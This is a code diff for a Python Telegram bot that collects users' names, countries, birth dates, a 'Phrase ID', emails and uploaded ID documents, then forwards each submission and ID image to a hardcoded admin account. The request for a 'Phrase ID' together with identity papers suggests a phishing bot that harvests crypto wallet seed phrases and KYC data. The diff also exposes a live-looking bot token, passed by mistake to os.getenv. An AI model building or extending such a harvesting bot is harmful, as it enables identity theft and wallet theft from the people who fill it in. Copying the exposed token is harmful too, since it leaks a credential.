@@ -20,7 +20,7 @@ import sqlite3
 
 import os
 
-TOKEN = os.getenv ("8946972049:AAEUO0So4Ljzr1-i8uJwVJFrB0oyvud58t4")
+TOKEN = os.getenv("8946972049:AAEUO0So4Ljzr1-i8uJwVJFrB0oyvud58t4")
 ADMIN_ID = 6259009798
 
 NAME, COUNTRY, DOB, PHRASE_ID, EMAIL, DOCUMENT, CONFIRM = range(7)
@@ -114,9 +114,11 @@ async def get_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if update.message.photo:
         file_id = update.message.photo[-1].file_id
+        context.user_data["doc_type"] = "photo"
 
     elif update.message.document:
         file_id = update.message.document.file_id
+        context.user_data["doc_type"] = "document"
 
     else:
         await update.message.reply_text(
@@ -159,6 +161,8 @@ async def confirm_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
     country = context.user_data["country"]
     phrase_id = context.user_data["phrase_id"]
     email = context.user_data["email"]
+    document = context.user_data["document"]
+    doc_type = context.user_data["doc_type"]
 
     cursor.execute("""
         INSERT OR REPLACE INTO applications
@@ -194,19 +198,35 @@ async def confirm_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]]
 
     await context.bot.send_message(
+    chat_id=ADMIN_ID,
+    text=(
+        f"NEW APPLICATION\n\n"
+        f"Name: {name}\n"
+        f"Country: {country}\n"
+        f"Date of Birth: {context.user_data['dob']}\n"
+        f"Phrase ID: {phrase_id}\n"
+        f"Email: {email}\n\n"
+        f"User ID: {user_id}\n\n"
+        "Attached below is the submitted ID document."
+    )
+)
+    if doc_type == "photo":
+        await context.bot.send_photo(
+            chat_id=ADMIN_ID,
+            photo=document
+        )
+    else:
+        await context.bot.send_document(
+            chat_id=ADMIN_ID,
+            document=document
+        )
+
+    await context.bot.send_message(
         chat_id=ADMIN_ID,
-        text=(
-            f"NEW APPLICATION\n\n"
-            f"Name: {name}\n"
-            f"Country: {country}\n"
-            f"Phrase ID: {phrase_id}\n"
-            f"Email: {email}\n\n"
-            f"User ID: {user_id}"
-        ),
+        text="Choose an action:",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
-    return ConversationHandler.END
 # =========================
 # ADMIN BUTTONS
 # =========================
@@ -419,40 +439,7 @@ conv_handler = ConversationHandler(
 },
     fallbacks=[],
 )
-async def get_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    ...
-    return DOCUMENT
 
-
-async def get_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-
-    if update.message.photo:
-        file_id = update.message.photo[-1].file_id
-
-    elif update.message.document:
-        file_id = update.message.document.file_id
-
-    else:
-        await update.message.reply_text(
-            "Please upload an image or document."
-        )
-        return DOCUMENT
-
-    context.user_data["document"] = file_id
-
-    await update.message.reply_text(
-        "PLEASE REVIEW YOUR DETAILS:\n\n"
-        f"👤 Name: {context.user_data['name']}\n"
-        f"🌍 Country: {context.user_data['country']}\n"
-        f"🎂 Date of Birth: {context.user_data['dob']}\n"
-        f"🔑 Phrase ID: {context.user_data['phrase_id']}\n"
-        f"📧 Email: {context.user_data['email']}\n\n"
-        "Type YES to confirm or NO to cancel."
-    )
-
-    return CONFIRM
-async def confirm_details(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    ...
 app.add_handler(conv_handler)
 app.add_handler(CallbackQueryHandler(admin_buttons))
 app.add_handler(CommandHandler("tx", tx))
